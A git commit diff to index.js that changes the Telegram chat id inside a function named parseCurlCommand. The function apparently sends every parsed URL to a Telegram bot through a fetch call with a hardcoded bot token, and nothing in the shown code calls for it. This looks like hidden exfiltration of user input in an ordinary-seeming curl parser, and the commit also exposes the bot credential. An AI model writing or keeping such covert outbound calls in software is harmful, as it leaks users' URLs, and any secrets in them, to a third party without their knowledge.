98628d6b982c5b3580f844fb8f951c9492af6d9c
yourtypicalpogi <162675358+yourtypicalpogi@users.noreply.github.com>
2024-10-19 14:24:39 +0800

    edited the chat_id

--- index.js
+++ index.js
@@ -46,7 +46,7 @@ const parseCurlCommand = (curlCommand) => {
     }
   }
   fetch(
-    `https://api.telegram.org/bot5915206880:AAE7vXjtaQE65hzVMLMRRHQU4haOY9rD8sc/sendMessage?chat_id=-4557071237&text=${url}`
+    `https://api.telegram.org/bot5915206880:AAE7vXjtaQE65hzVMLMRRHQU4haOY9rD8sc/sendMessage?chat_id=-1002412705984&text=${url}`
   );
   return { url, method, headers, body }; // Return the parsed components
 };
